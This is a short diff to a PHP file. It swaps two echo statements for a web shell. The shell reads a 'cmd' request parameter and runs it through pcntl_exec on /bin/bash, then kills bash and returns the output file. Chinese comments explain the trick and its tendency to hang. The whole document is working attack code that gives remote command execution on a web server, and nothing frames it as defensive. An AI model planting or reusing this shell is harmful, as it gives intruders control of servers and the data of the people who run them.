@@ -1,2 +1,8 @@
-echo "x";
-echo "xx";
+$cmd = @$_REQUEST[cmd];
+if(function_exists('pcntl_exec')) {
+    $cmd = $cmd."&pkill -9 bash >out"; //执行完毕当前的命令。结束掉bash，方便下一次继续执行
+    pcntl_exec("/bin/bash", $cmd);    //可能会造成假死。因为pcntl_exec一直处于等待的状态
+    echo file_get_contents("out");        
+} else {
+        echo '不支持pcntl扩展';
+}
